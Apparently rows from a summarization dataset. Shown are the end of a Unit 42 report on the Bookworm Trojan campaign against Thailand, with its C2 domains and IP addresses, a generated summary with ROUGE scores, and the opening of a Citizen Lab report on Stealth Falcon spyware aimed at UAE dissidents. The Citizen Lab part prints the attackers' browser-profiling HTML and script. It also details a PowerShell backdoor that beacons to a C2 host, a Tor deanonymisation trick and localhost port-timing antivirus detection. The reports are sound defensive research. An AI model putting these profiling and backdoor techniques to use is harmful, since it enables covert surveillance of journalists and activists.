know the exact version of the Trojan they are communicating with in order to install appropriate supplemental modules.While a plausible premise, our data set does not fully support the hardcoded dates in Bookworm samples as a build identifier. To attempt to confirm the dates acting as a build ID, we extracted all of the modules for each Bookworm sample. We then compared the modules of each Bookworm sample that had the same date values. Most of the modules were identical amongst Bookworm samples using the same date string, but several samples had differing modules yet the same date string. For instance, Table 1 shows two sets of Bookworm samples with the ""20150716"" and ""20150818"" date codes that have completely different Leader.dll modules.Date Code Leader.dll Module Compile Date 20150716 e602a12e8173ca17ba4a0c6c12a094c1 2015-07-18 20150716 4537257cb69a467a63c5a561825571f9 2015-07-23 20150818 e6cb32805bc5d758a5ea1dcd3c05beb8 2015-08-24 20150818 7065c709dd9dc7072dd5a5e2904c2d78 2015-08-31Table 1 Two sets of Bookworm samples that share a sttic date cod but have different Leader modulesIf the Bookworm developers used the date code as a build identifier, it would suggest that a new date code would have been added to samples using the new Leader module. Due to these changes without a new date string, we believe the date codes are used for campaign tracking rather than a Bookworm build identifier. Unit 42 will continue to compare the date codes to the Bookworm modules in future samples and will modify our assessment if indications suggest the date string is indeed a build identifier.Campaign CodesWe believe that Bookworm samples use the static date string as campaign codes, which we used to determine the approximate date of each attack that we did not have detailed targeting information. We also compared these campaign codes to the date the attacks occurred or the date of the event seen in decoy documents to get a sense of the threat group's internal operations.A number of the Bookworm samples include a decoy that is opened during installation of the malware in an attempt to disguise the compromise. The threat actors have used two types of decoys thus far: a legitimate Flash Player installation application and a standalone Flash application to display a photo slideshow. The use of a Flash Player installer, seen in Figure 1, suggests that the threat actors are using social engineering to instruct the victim to update or install the Flash Player application. The Bookworm campaign code ""20150818"" was used in all samples associated with these legitimate Flash Player installers.Unit 42 has witnessed six decoy slideshows used in a Bookworm campaign targeting Thailand. All six of these decoy slideshows contain pictures that in some manner relate to Thailand. One known decoy includes an animation of what appears to be children in Thailand going to temple (Figure 2), which is associated with a spear-phishing attack on a branch of the Thailand government that occurred on July 27, 2015. The decoy's filename is ""wankaophansa.exe"" that suggests the animation is regarding Wan Kao Phansa, which is a term for first day of the three month long rainy season. Wan Kao Phansa is a national holiday in Thailand, which in 2015 started on July 31. The attack occurred four days before the actual holiday and had a campaign code of ""20150716"", which is eleven days before the attack took place.We do not have detailed targeting information on the attacks that delivered the remaining five decoy slideshows. To determine the approximate date of these attacks, we compared the Bookworm campaign code associated with each decoy slideshow and found that they coincide with the timeline of events seen in the photos in the decoy slideshows.Three of the decoys analyzed are related to the August 17, 2015 bombing near the Erawan Shrine in Bangkok, Thailand, as seen in Figures 3, 4 and 5. The campaign code ""20150801"" is associated with the decoy slideshow showing the graphic Erawan Shrine bombing (Figure 3), which is 16 days before to the actual event took place.The second bombing-related decoy, seen in Figure 4 contained pictures of the arrest of a bombing suspect named Adem Karadag. This arrest was made on August 29, 2015, which is 11 days after the campaign code ""20150818"" that was associated with the decoy slideshow.The third and final bombing-related decoy slideshow contains pictures of Adem Karadag re-enacting his role in the bombing for police (Figure 5). This re-enactment is a standard procedure for Thai police, which in this particular case took place on September 26, 2015. The campaign code ""20150920"" is associated with this decoy, which is six days before the actual event took place.Another decoy slideshow associated with the Bookworm attack campaign contains photos of an event called Bike for Dad 2015. Bike for Dad is a cycling event that will be held on December 11, 2015 to commemorate the King of Thailand Bhumibol Adulyadej's 88th birthday. Many high profile figures in Thailand are promoting this event, such as the Prime Minister Prayut Chan-o-cha who is seen in many of images in the decoy slideshow (Figure 6).The campaign code ""20150920"" is associated with this decoy, which is a week prior to media articles announcing that the Crown Price of Thailand Maha Vajiralongkorn will lead the Bike for Dad 2015 event. At first, we believed the use of the Bike for Dad 2015 event was unrelated to the previous Erawin Shine bombing decoys. According to the same announcement article, the Crown Prince said that the bike route would pass the Ratchaprasong intersection, which is where the Erawin Shine bombing took place. Therefore, the threat actors using this within their social engineering attempts continues to follow the theme involving the bombing of the shrine in Bangkok, as it is undoubtedly still in the hearts and minds of the Thai people.The final remaining known decoy includes photos of Chitpas Tant Kridakon (Figure 7), who is known as heiress to the largest brewery in Thailand. Chitpas is heavily involved with Thailand politics and was a core leader of the People's Committee for Absolute Democracy (PCAD), which is an organization that staged anti-government campaigns in 2013 and 2014. As recently as September 2015, Chitpas has been in the news for her attempts to become an officer in the Royal Thai Police force, which has caused protests due to her political stance. Two of the images in the slideshow can be seen in an article that was published on September 20, 2015. These images were associated with the Bookworm campaign code ""20150905"".By comparing the campaign codes with the dates of known attacks or the date of the events shown in the decoys, we found that the campaign codes precede the attack or event dates by 6 to 18 days. The campaign code date preceding the attack or associated events suggests that the threat actors perform development operations on their tools and then choose their decoy. These decoy documents also suggest that the threat actors actively track current news events and use photographs from the media to create their decoy slideshows.Compromised HostsUnit 42 analyzed the systems communicating with the Bookworm C2 domains and found that a majority of the IP addresses existed within autonomous systems (ASN) located in Thailand. The pie chart in Figure 8 shows that the vast majority (73%) of the hosts are geographically located in Thailand, which matches the known targeting of this threat group. We believe that the IP addresses from Canada, Russia and Norway are analysis systems of antivirus companies or security researchers. The IP addresses in South Korea prove interesting and could suggest that this threat group has carried out an attack campaign on targets in locale as well. However, we've found no additional evidence to corroborate this theory.We took the IP addresses seen communicating with Bookworm C2 servers and obtained their geographic coordinates using an IP geolocation database and plotted them on a map, as seen in Figure 9. A majority of the IP addresses in Thailand have coordinates in the Bangkok metropolitan area, with one in the southern town of Pattini and one in the Phanat Nikhom District of the Chonburi Province. IP geolocation systems are not perfectly accurate, but the data suggests that most of the compromised hosts exist near the largest city of Bangkok. This grouping of compromised hosts also aligns with the known targeting, as Bangkok and Nonthaburi is where a majority of the government of Thailand exists.Bookworm's Threat InfrastructureBookworm-related infrastructure created by threat actors mainly involves the use of dynamic domains, however, an early sample used a fully qualified domain name (FQDN) owned by the actor. The actors also appear to have access to legitimate servers that they use to host Bookworm and other related tools for attacks. Overall, the Bookworm infrastructure overlaps with the infrastructure hosting C2 servers used by various attack tools, including FFRAT, Poison Ivy, PlugX, and others.Compromised Web ServersUnit 42 has seen threat actors hosting Bookworm and other related tools on legitimate websites, which suggests the actors have unauthorized access to these servers. We have witnessed Bookworm samples hosted on a website belonging to the following organizations:Two branches of government in ThailandThai MilitaryA Taiwanese Labor AssociationThree of the four compromised webservers have been breached in the past with each being listed on Zone-h as being defaced, while the remaining site was defaced by the TURKHACKTEAM, according to a Google cache from November 11, 2015. The specific details of how the actors gained access to these sites is unclear, however, one site has a publicly accessible form that would allow visitors to upload files to the webserver (Figure 8). Unit 42 believes that threat actors could have uploaded Bookworm to this server using this form. It is also possible that the threat actors uploaded an ASP shell to gain further control over this webserver. We also speculate that these threat actors may use strategic web compromises (SWC) as an attack vector in future campaigns using their unauthorized access to webservers.The site hosting this file upload form belongs to one of the organizations targeted with Bookworm. This may suggest that the threat actors used this webserver to pivot from the webserver into the internal network.Infrastructure Overlap and Related ToolsThe domains hosting Bookworm C2 servers (see Indicators of Compromise section of our Bookworm blog) connect to a larger infrastructure that the threat actors are using to host C2 servers for other tools in their toolset. So far, Unit 42 has seen infrastructure overlaps with servers hosting C2 servers for samples of the FFRAT, PlugX, Poison Ivy and Scieron Trojans, suggesting that the threat actors use these tools as the payload in their attacks.Unit 42 enumerated the threat infrastructure related to Bookworm and created a chart to visualize connected entities to its current attack campaign. The infrastructure is fairly complex and has many overlaps with other toolsets. Figure 11 below shows a fraction of the threat infrastructure that visualizes a connection between Bookworm, FFRAT, PlugX and Poison Ivy.The overlap between Bookworm, PlugX and Poison Ivy samples involves the use of the Smart Installer Maker, which is a common technique used by this threat group. In one particular case, a sample of the Smart Installer Maker (MD5: 6741ad202dcef693dceb98b0a10c49fc) installed both a PlugX and Poison Ivy Trojan that communicated with domains that resolved to an IP address (119.205.158.70) that also resolved a Bookworm C2 domain (sswmail.gotdns[.]com). This IP address was also used to resolve a domain (qemail.gotdns[.]com) that actors used to host a C2 server for another Trojan known as FFRAT. We observed another direct overlap in a C2 domain (ubuntudns.sytes[.]net) used for both Bookworm and FFRAT.As previously mentioned, the infrastructure related to Bookworm is fairly complex with many connections to domains hosting C2 servers for other tools. The related infrastructure and associated malware can be seen in the table below.Domain Malware Family/Cluster web12.nhknews[.]hk Bookworm systeminfothai.gotdns[.]ch Bookworm bkmail.blogdns[.]com Bookworm thailandbbs.ddns[.]net Bookworm blog.nhknews[.]hk Bookworm news.nhknews[.]hk Bookworm sysnc.sytes[.]net Bookworm debain.servehttp[.]com Bookworm sswmail.gotdns[.]com Bookworm sswwmail.gotdns[.]com Bookworm ubuntudns.sytes[.]net Bookworm, FFRAT linuxdns.sytes[.]net Bookworm, FFRAT www.chinabztech[.]com FFRAT www.tibetonline[.]info FFRAT 3h01.dwy[.]cc FFRAT www.vxea[.]com FFRAT bdimg.s.dwy[.]cc FFRAT nine.alltosec[.]com FFRAT www.rooter[.]tk FFRAT wucy08.eicp[.]net FFRAT welcome.dnsd[.]info FFRAT www.ifilmone[.]com FFRAT pcal2.dwy[.]cc FFRAT luotuozhizhu.blog.163[.]com FFRAT office.alltosec[.]com FFRAT ftpseck.ftp21[.]net FFRAT wuzhiting.3322[.]org FFRAT qemail.gotdns[.]com FFRAT googleupdating[.]com FFRAT welcometohome.strangled[.]net FFRAT zz.alltosec[.]com FFRAT back.rooter[.]tk FFRAT products.alltosec[.]com FFRAT windowsupdating[.]net FFRAT app.rooter[.]tk FFRAT hkemail.f3322[.]org FFRAT pcal2.yahoolive[.]us FFRAT happy.tftpd[.]net PlugX weather.webhop[.]me PlugX ns1.vancouversun[.]us PlugX n5579a.voanews[.]hk PlugX hope.jumpingcrab[.]com PlugX news.nowpublic[.]us PlugX web.vancouversun[.]us PlugX news.voanews[.]hk PlugX bugatti.from-wa[.]com PlugX web.voanews[.]hk PlugX ns3.yomiuri[.]us PlugX tree.crabdance[.]com PlugX supercat.strangled[.]net PlugX webupdate.strangled[.]net PlugX breaknews.mefound[.]com PlugX succ.gotdns[.]com Poison Ivy, PlugX imail.gotdns[.]com Poison Ivy, PlugX wmail.gotdns[.]com Poison Ivy, PlugX xxcase.gotdns[.]com Poison Ivy romadc.homelinux[.]com Poison Ivy 3389temp.dyndns[.]org Poison Ivy ahcase.gotdns[.]com Poison Ivy kcase.gotdns[.]com Poison Ivy 3389pi.servegame[.]org Poison Ivy flashcard.gotdns[.]com Poison Ivy kr-update.homelinux[.]com Poison Ivy 3389.homeunix[.]org Poison Ivy flashgame.gotdns[.]com Poison Ivy anhei.gotdns[.]com Poison Ivy xcase.gotdns[.]com Poison Ivy education.suroot[.]com Scieron server.organiccrap[.]com Scieron pricetag.deaftone[.]com Scieron apple.dynamic-dns[.]net Scieron williamsblog.dtdns[.]net Scieron will-smith.dtdns[.]net Scieron durant.dumb1[.]com ScieronTable 2 Threat Infrastructure Related to BookwormWe made connections between domains seen in Table 2 through shared stolen code signing certificates, other PE build commonalities, passive DNS data and direct C2 domain overlap. The domains connected using passive DNS all share common IP addresses used to resolve the domain. The following IP addresses provided many of the connection points within the infrastructure via passive DNS overlap:103.226.127.47104.156.239.105112.167.143.179115.144.107.22115.144.107.46115.144.107.52115.144.107.53115.144.107.134115.144.166.209119.205.158.7043.248.8.249ConclusionThreat actors have targeted the government of Thailand and delivered the newly discovered Bookworm Trojan since July 2015. The actors appear to follow a set playbook, as the observed TTPs are fairly static within each attack in this campaign. The threat actors have continually used Flash Player installers and Flash slideshows for decoys. The decoy slideshows all contain photos from very meaningful events to individuals in Thailand, suggesting that the actors continually look for impactful events to use to disguise their attacks.The vast majority of systems communicating with Bookworm C2 servers are within the Bangkok metropolitan area where a majority of the government of Thailand exists. While the current campaign has targeted the Thai government, Unit 42 believes the threat actors will target other governments to deliver Bookworm in future campaigns.";The ITSecurity report summarizes that PlugX, Poison Ivy, and other malicious software have been detected on the network. These malicious programs are capable of stealing sensitive information, corrupting data, and disrupting normal operations. The report recommends that the network should be regularly monitored and updated with the latest security patches. Threat actors have targeted the government of Thailand and delivered the newly discovered Bookworm Trojan since July 2015. The actors appear to follow a set playbook, as the observed TTPs are fairly static within each attack in this campaign. The threat actors have continually used Flash Player installers and Flash slideshows for decoys. The decoy slideshows all contain photos from very meaningful events to individuals in Thailand, suggesting that the actors continually look for impactful events to use to disguise their attacks. The vast majority of systems communicating with Bookworm C2 servers are within the Bangkok metropolitan area where a majority of the government of Thailand exists. While the current campaign has targeted the Thai government, Unit 42 believes the threat actors will target other governments to deliver Bookworm in future campaigns.;en;{'r': 0.10337768679631525, 'p': 0.8278688524590164, 'f': 0.18380345571507228};{'r': 0.055919615552643076, 'p': 0.7485380116959064, 'f': 0.1040650393568015};{'r': 0.1023541453428864, 'p': 0.819672131147541, 'f': 0.18198361950033162}
https://citizenlab.ca/2016/05/stealth-falcon/;Keep Calm and (Don’t) Enable Macros A New Threat Actor Targets UAE Dissidents;"1. Executive SummaryThis report describes a campaign of targeted spyware attacks carried out by a sophisticated operator, which we call Stealth Falcon. The attacks have been conducted from 2012 until the present, against Emirati journalists, activists, and dissidents. We discovered this campaign when an individual purporting to be from an apparently fictitious organization called ""The Right to Fight"" contacted Rori Donaghy. Donaghy, a UK-based journalist and founder of the Emirates Center for Human Rights, received a spyware-laden email in November 2015, purporting to offer him a position on a human rights panel. Donaghy has written critically of the United Arab Emirates (UAE) government in the past,1 and had recently published a series of articles based on leaked emails involving members of the UAE government.2Circumstantial evidence suggests a link between Stealth Falcon and the UAE government. We traced digital artifacts used in this campaign to links sent from an activist's Twitter account in December 2012, a period when it appears to have been under government control. We also identified other bait content employed by this threat actor. We found 31 public tweets sent by Stealth Falcon, 30 of which were directly targeted at one of 27 victims. Of the 27 targets, 24 were obviously linked to the UAE, based on their profile information (e.g., photos, ""UAE"" in account name, location), and at least six targets appeared to be operated by people who were arrested, sought for arrest, or convicted in absentia by the UAE government, in relation to their Twitter activity.The attack on Donaghy -- and the Twitter attacks -- involved a malicious URL shortening site. When a user clicks on a URL shortened by Stealth Falcon operators, the site profiles the software on a user's computer, perhaps for future exploitation, before redirecting the user to a benign website containing bait content. We queried the URL shortener with every possible short URL, and identified 402 instances of bait content which we believe were sent by Stealth Falcon, 73% of which obviously referenced UAE issues. Of these URLs, only the one sent to Donaghy definitively contained spyware. However, we were able to trace the spyware Donaghy received to a network of 67 active command and control (C2) servers, suggesting broader use of the spyware, perhaps by the same or other operators.Figure 1: Tag cloud of bait content topics used by Stealth Falcon showing a strong emphasis on political topics and narratives critical of the UAE government2. BackgroundRori Donaghy3 is a London-based journalist who currently works for UK news organization Middle East Eye, a website that covers news in the Middle East.4 Middle East Eye has recently published a series of articles about UAE foreign policy, based on leaked emails involving members of the UAE government. Previously, Donaghy led the Emirates Center for Human Rights,5 an organization he founded to ""promote the defence of human rights in the United Arab Emirates ... through building strong relationships with the media, parliaments and other relevant organisations outside the UAE"".62.1. Political and Human Rights Situation in the UAEIn its most recent (2015) Freedom in the World ranking, Freedom House classified the UAE as ""not free,"" and noted that the UAE continues to ""suppress dissent"".7 Human Rights Watch stated in its most recent (2016) country report, that the UAE has ""continued ... to arbitrarily detain and in some cases forcibly disappear individuals who criticized the authorities"".8 Amnesty International says that UAE courts have ""accepted evidence allegedly obtained through torture"".9Specifically in the online realm, there is evidence that the UAE government has previously conducted malware attacks against civil society. At least three dissidents10 including a journalist, and UAE human rights activist Ahmed Mansoor, were targeted in 2012 with Hacking Team spyware11 by a Hacking Team customer in the UAE, apparently operating under the auspices of the office of Sheikh Tahnoon bin Zayed al-Nahyan,12 a son of the founder of the UAE, and now the UAE Deputy National Security Advisor.13 The UAE client had a license from Hacking Team to concurrently infect and monitor 1100 devices.14Figure 2: Diagram of Stealth Falcon's known Targets, Fake Personas, and campaign Artefacts, along with relevant sections of the report. The document paints a picture of a large-scale campaign with a focus on critics of the UAE Government3. The November 2015 Attack: An ""Invitation""This section describes an email attack against journalist Rori Donaghy. The operators used a Microsoft Word macro that installs a custom backdoor allowing operators to execute arbitrary commands on a compromised machine.3.1 Initial Attack EmailIn November 2015, the journalist Donaghy received the following email message, purportedly offering him a position on a panel of human rights experts:From : the_right_to_fight@openmailbox.orgSubject : Current Situation of Human Rights in the Middle East Mr. Donaghy, We are currently organizing a panel of experts on Human Rights in the Middle East. We would like to formally invite you to apply to be a member of the panel by responding to this email. You should include your thoughts and opinions in response to the following article about what more David Cameron can be doing to help aid the Middle East. http://aax.me/d0ddeThank you. We look forward to hearing back from you, Human Rights: The Right to FightDonaghy was suspicious of the email, and forwarded it to us for analysis. We found that the link in the email (http://aax.me/d0dde) loaded a page containing a redirect to the website of Al Jazeera. Before completing the redirect, it invoked JavaScript to profile the target's computer. We describe the profiling in detail in Section 3.1-3.3 below.3.2 Communication with the OperatorOn our instruction, Donaghy responded to the email, asking for further information. The operators responded with the following message:From : the_right_to_fight@openmailbox.orgSubject : RE: Current Situation of Human Rights in the Middle East Mr. Donaghy, Thank you for getting back to us. We are very interested in you joining our panel. The information you requested is in the attached document. In order to protect the content of the attachment we had to add macro enabled security. Please enable macros in order to read the provided information about our organization. We hope you will consider joining us.Thank you. We look forward to hearing back from you, Human Rights: The Right to FightBy chance, the attachment was identified as malicious and blocked by a program running in Donaghy's email account. We instructed him to follow up and request that the operators forward the attachment via another method. Donaghy received the following reply:From : the_right_to_fight@openmailbox.orgSubject : RE: Current Situation of Human Rights in the Middle East Mr. Donaghy, We apologize for having problems with our attachment. Please follow this link to download our organizational information. http://aax.me/a6faa The link has been password protected. The password is: right2fight In order to protect the content of the attachment we also had to add macro enabled security. Please enable macros in order to read the provided information about our organization. We hope you will consider joining us.Thank you. We look forward to hearing back from you, Human Rights: The Right to FightThis second link (http://aax.me/a6faa) redirects to the following URL using an HTTP 302 redirect:https://cloud.openmailbox.org/index.php/s/ujDNWMmg8pdG3AL/authenticateThis is a password-protected link to a file shared on an ownCloud15 instance. We obtained this file, and found it to be a Microsoft Word document.3.3 The Malicious DocumentThe document is:Filename: right2fight.docm MD5: 80e8ef78b9e28015cde4205aaa65da97 SHA1: f25466e4820404c817eaf75818b7177891735886 SHA256: 5a372b45285fe6f3df3ba277ee2de55d4a30fc8ef05de729cf464103632db40fWhen opened, the target is greeted with the following image, purporting to be a message from ""proofpoint,"" a legitimate provider of security solutions for Office 365.16 The image claims that ""This Document Is Secured"" and requests that the user ""Please enable macros to continue.""Figure 3: Fake Proofpoint image in the malicious document sent to DonaghyIf the target enables macros, they are presented with the following document:Figure 4: Document that Donaghy would have seen, had he enabled macrosThe document purports to be from an organization called ""The Right To Fight,"" and asks the target Donaghy to open the link in the original email he received (the email containing the profiling URL). We believe that ""The Right To Fight"" is a fictitious organization, as their logo appears to be copied from an exhibition about ""African American Experiences in WWII"".17 Further, ""The Right to Fight"" has no discernable web presence.Figure 5: Logo from exhibition about African American experiences in WWII.3.3.1 ProfilingThe document attempts to execute code on the recipient's computer, using a macro. The macro passes a Base64-encoded command to Windows PowerShell, which gathers system information via Windows Management Instrumentation (WMI), and attempts to determine the installed version of .NET by querying the registry (full script available in Appendix A: Stage One PowerShell Command).3.3.2 Communication & Obtaining a ShellGathered information is returned to http://adhostingcache.com/ehhe/eh4g4/adcache.txt, and the server's response is executed as a PowerShell command. At the time, adhostingcache.com resolved to 95.215.44.37. The domain was apparently deleted on November 30th 2015 (Donaghy received the malicious Word Document on November 24th 2015). A new domain, adhostingcaches.com, was registered on December 3rd, which points to the same IP address. The deletion of adhostingcache.com may reflect operator suspicion that the file received by Donaghy had been sent to security researchers.The server response is a PowerShell command that decodes and materializes an invocation of a Base64-encoded PowerShell command to disk as IEWebCache.vbs, and creates a scheduled task entitled ""IE Web Cache"" that executes the file hourly (full script available in Appendix B: Stage Two PowerShell Command).IEWebCache.vbs runs a Base64-encoded PowerShell command, which periodically POSTs a unique identifier to https://incapsulawebcache.com/cache/cache.nfo (via HTTPS without verifying the server certificate, and with a hardcoded user-agent header matching Internet Explorer 10.6). The script executes server responses as PowerShell commands, responding back to the server with the exit status of, output of, or any exceptions generated by the commands.This gives the operator control over the victim's computer, and allows the operator to install additional spyware or perform other activities. All commands and responses are encrypted using RC4 with a hardcoded key, and the encrypted message is prefixed with a hardcoded value.Despite some similarities in functionality to the Empire backdoor,18 we were unable to identify any shared code, and we suspect that the backdoor is custom-made.3.4. Technical Analysis: aax.me Browser ProfilingWhile aax.me has a public interface where anyone may shorten a link, aax.me only conducts browser profiling of individuals who click on links that are specially shortened by Stealth Falcon operators.In November 2015, when we accessed the link in the second email that Donaghy received, http://aax.me/a6faa, we found that it redirected directly to https://cloud.openmailbox.org/index.php/s/ujDNWMmg8pdG3AL/authenticate via an HTTP 302 redirect. When we accessed the link in the first email that Donaghy received, http://aax.me/d0dde, the server responded with the following page:<iframe src='redirect.php' height='1' width='1' border='0' scrolling='no' frameborder='0' unselectable='yes' marginheight='0' marginwidth='0' onload='setTimeout(""document.location =\""http://www.aljazeera.com/indepth/opinion/2015/11/british-pm-middle-east-human-rights-151103070038237.html\"""", 20000)'></iframe><br><br><br><center><img src='loading.gif'><br>Loading the website:<br><b>http://www.aljazeera.com/indepth/opinion/2015/11/british-pm-middle-east-human-rights-151103070038237.html</b>.<br>This may take a few seconds.</center>The page is apparently designed to redirect to an Al Jazeera op-ed after twenty seconds.19 However, the URL is incorrect: the last character of the filename should be a ""1"" instead of a ""7"". Therefore, an Al Jazeera 404 page is returned instead of the op-ed. It is possible that the use of ""7"" instead of ""1"" represents a transcription error on the part of the operators. When we accessed this same aax.me URL in March 2016, it redirected directly to the Al Jazeera URL (with typo) via an HTTP 302 redirect.The iframe, http://aax.me/redirect.php, reloads itself with a parameter ""inFr"" in its query string, to indicate whether the page has been opened up inside a frame.<html><body><script type=""text/javascript"">if(window!=window.top){inFr=""1""}else{inFr=""0""}document.location=document.location+""?inFr=""+inFr,</script><noscript><img src=""?jSc=0""/></noscript></body></html>If the page has not been opened up inside a frame (inFr=0), then a blank page is returned. If the page is opened inside a frame (inFr=1), as is the case here, then the following page is returned (we ommitted the PHPSESSID value):<html><head></head><body><div id='display' height='1' style='display:none,'></div><form id='statsPost' action='?stats=1' method='POST'><input type=""hidden"" name=""PHPSESSID"" value="""" /><input id='theData' name='theData' type='hidden' value='' /></form><script type='text/javascript' src='redirect.js'></script></body></html>We examined the referenced JavaScript file, http://aax.me/redirect.js. The file is designed to profile a user's system, perhaps to gather intelligence about potentially exploitable vulnerabilities. The file has apparently not been updated since 7 May 2013,20 rendering some of the probing obsolete. We enclose the file's full contents in Appendix C: JavaScript Profiling File. The profiling performs the following actions:For Internet Explorer, it attempts to create several instances of ActiveXObject to get the versions of Flash, Shockwave, Java, RealPlayer, Windows Media Player, and Microsoft Office (classified as either 2003 , 2007 , or 2010 ).For non-Internet Explorer browsers, it attempts to get a list of enabled plugins from navigator.mimeTypes .For all browsers, it captures the user agent, whether cookies are enabled, the OS, the size of the browser window, and the timezone. It classifies browsers into different versions, denoted by letters, based on the existence and behavior of certain JavaScript methods.The script attempts to exploit an information leak in older versions of Tor Browser. We explore the technique used in Section 3.5 .For Windows browsers (except Opera, and versions of Internet Explorer before IE9), it sends a series of XMLHttpRequests to 127.0.0.1, which we believe are designed to deduce if the computer is running any one of several specific antivirus programs. The code for this appears to be borrowed from the JS-Recon 21 port scanning tool. 22 The creator of JS-Recon presented the tool at BlackHat Abu Dhabi in 2010. We explore such techniques in more detail in Section 3.6 .We were unfamiliar with the website aax.me, so we investigated it further. We found that the main page of aax.me purported to be a public URL shortening service, powered by YOURLS,23 an open source PHP framework allowing anyone to set up their own URL shortening service. We are unable to ascertain whether the site actually uses any YOURLS code. We also noted that the homepage contains a typo (""Shortend [sic] URL"").Figure 6: Homepage of aax.meWe shortened a URL using the homepage, but found that clicking on the shortened URL did not trigger the loading of the intermediate page, http://aax.me/redirect.php. We also did not find the code for redirect.php or redirect.js in the public code repository for YOURLS.24 Thus, we deduced that this code was likely specially written by the operators, and the link sent to Donaghy was likely created by someone with administrator access to aax.me.3.5. Technical Analysis: aax.me Tor Deanonymization AttemptThe aax.me site appears to attempt to deanonymize users of Tor Browser. While the technique the operators used was out-of-date at the time we observed the attack, the attempted Tor deanonymization speaks to their motivations and potential targets.The script first detects Tor Browsers by checking whether navigator.buildID is set to zero (all testing was conducted on English, Windows builds of Tor Browser). Versions of Tor Browser before 2.3.25-12 (released on 13 August 2013) had their buildID set to zero. This behavior was originally introduced in TorButton,25 in support of the goal of making Tor users appear homogenous.26 Current Tor Browser versions have navigator.buildID set to a different distinctive value, 20000101000000.When the script detects a Tor Browser, it attempts to deduce the version of Tor Browser by checking for the existence and behavior of certain JavaScript methods. Once a browser is determined to be older than a certain version of Tor Browser, the script exploits a now-fixed bug to get the disk path of the browser installation.27 The disk path may contain the target's username, which may include the target's real name.The bug in Tor Browser was first disclosed at Defcon 17, which took place in August 2009.28 The bug was first fixed on on 25 May 2012 in Tor Browser release 2.2.35-13.29 The bug was, however, later reintroduced into Tor Browser on 18 December 2013 with the release of Tor Browser 3.5, and subsequently fixed again in Tor Browser 3.6 on 29 April 2014.30 However, unfortunately for the operators, they failed to update their profiling script to reflect Tor Browser's navigator.buildID change (before the bug was reintroduced). Thus, the profiling script did not detect Tor Browsers with the reintroduced bug as Tor Browsers, so it did not try to exploit them. Even if it had been updated to reflect the navigator.buildID change, the version check in the Tor Browser exploitation code would also have to be updated to select the versions with the reintroduced bug for exploitation.The version of Tor Browser (as determined by JavaScript checks) is submitted back to the server, along with the value of navigator.oscpu (which reveals the version of the OS on which Tor Browser is running -- e.g., the latest version of Tor Browser on OSX El Capitan reveals: ""Intel Mac OS X 10.11"") which is set to ""Windows NT 6.1"" in the latest Tor browser, navigator.vendor (which appears blank in the latest Tor Browser), and any data gathered about the installation path.3.6. Technical Analysis: aax.me Antivirus ProfilingInterestingly, aax.me also attempts to determine the presence of various antivirus products on a target's machine.We expand on the probing of antivirus programs which we observed on aax.me, as we were unfamiliar with this technique. The technique appears to work on any modern version of Windows, with the latest versions of Chrome, Firefox, and IE/Edge (though, the profiling script excludes IE versions less than IE9 from the profiling, using the vertical tab test).31 Specifically, the script conducts GET XMLHttpRequests (one at a time) to 127.0.0.1/ on the following ports: 12993, 44080, 24961, 1110, 6646, 6999, 30606. The script stops conducting these requests if it finds one request whose readyState is set to 4 less than 20ms after the request was initiated (200ms for port 6646), and submits the number of this port to the server.The latest versions of Internet Explorer/Edge, Chrome, and Firefox (except Tor Browser) will all perform these XMLHttpRequests to 127.0.0.1 on behalf of any site. Of course, the result of such a request will most likely not be available to the script, due to the same-origin policy, and likely absence of a CORS32 header in the response. Indeed, the script does not attempt to read the results of its requests. Rather, it leverages the fact that the web browser makes the status of the request sent available, via the readyState parameter of an XMLHttpRequest instance (1 approximately represents TCP SYN sent, and 4 represents HTTP response received or TCP connection terminated). For a closed port, Windows will issue an RST/ACK for each SYN sent. However, it appears that Windows' TCP stack will not consider an outgoing connection it is initiating to be terminated until it has sent 3 SYNs, and received three corresponding RST/ACKs (or timeouts).Figure 7: Three RST/ACKs required until Windows considers outgoing TCP connection terminatedWhen testing with a TCP connection from Windows to a remote host, we can clearly see that Windows transmits the second SYN ~500ms after the first RST/ACK, and the third SYN ~500ms after the second RST/ACK.Figure 8: Windows sends the next SYN 500ms after the latest RST/ACKThus, the readyState value for a request to a closed port on 127.0.0.1 will not be set equal to 4 until approximately 1000ms after the request is issued. In summary, one can use this technique to distinguish between a closed port (readyState set to 4 at around 1000ms), an open port (readyState set to 4 before 1000ms), and a filtered port (readyState set to 4 long after 1000ms).This script was apparently designed to detect the presence of certain components of Avast, Avira, ESET, Kaspersky, and Trend Micro antivirus products. We were not able to determine which program the probing of port 24961 was designed to detect. We verified that the latest version of Avast can be detected by this script, as it opens TCP port 12993, which is associated with its Mail Shield component for scanning email traffic, port 6999 is opened by Trend Micro's tmproxy33 which scans web and email traffic, port 1110 is used by Kaspersky34 to scan web and email traffic, it appears that Avira's Web Protection component for scanning web traffic used to open port 44080,35 though we observed it opening 44081 instead, port 30606 appears to have been used by ESET to scan web and email traffic,36 but we did not observe this port open while testing the latest version of ESET, port 6646 may be used by McAfee, though we did not test this.37The code for the port scanning appears to be adapted from the JS-Recon port scanning tool.38 JS-Recon is a generic tool that enumerates all open ports on 127.0.0.1 in a range, it does not specifically target anti-virus programs. The scan_xhr and check_ps_xhr functions in the aax.me profiling script are similar to the scan_ports_xhr and check_ps_xhr functions in JS-Recon. The creator of JS-Recon seems to have first presented the tool at BlackHat Abu Dhabi in 2010.39Figure 9: Image from the author of JS-Recon showing how long WebSocket and XMLHttpRequest (""COR"") connections remain in their initial readyState on Windows.40Note that this technique can be generalized to any remote content timing side channel (e.g, the onerror event for an Image). Additionally, one can identify the presence of an open port on 127.0.0.1 that speaks HTTP without using timing information, and thus without the Windows TCP behavior assumption (e.g., by handling the onerror and oncomplete events of certain types of link elements).We are unsure whether the purpose of the antivirus profiling is to identify potentially exploitable antivirus software running on a target's computer, or for evasion of antivirus products. In December 2015, Google Security discovered a critical vulnerability in Avast's antivirus product, which involved a webpage sending HTTP requests to a port that Avast opens on 127.0.0.1. Google Security demonstrated that the vulnerability allowed exfiltration of arbitrary files from a victim's disk.41 In January 2016, Google Security discovered a critical vulnerability in Trend Micro's antivirus product, which similarly involved a web page sending HTTP requests to a port that Trend Micro opens on 127.0.0.1. Google Security demonstrated that the vulnerability allowed arbitrary command execution.4. The Case of the Fake JournalistIn the course of our investigation we scanned the e-mail of journalist Donaghy and found evidence that he had been contacted by a fictitious journalist, whom we linked to Stealth Falcon.We scanned Donaghy's GMail account for any previous messages featuring links that redirected through aax.me. We identified the following message from December 2013, purporting to be from a UK journalist named Andrew Dwight:From: andrew.dwight389@outlook.comSubject: FW: Correspondence Request Greetings Mr. Donaghy, I have been trying to reach you for comment and I am hoping that this e-mail reaches the intended recipient. My name is Andrew 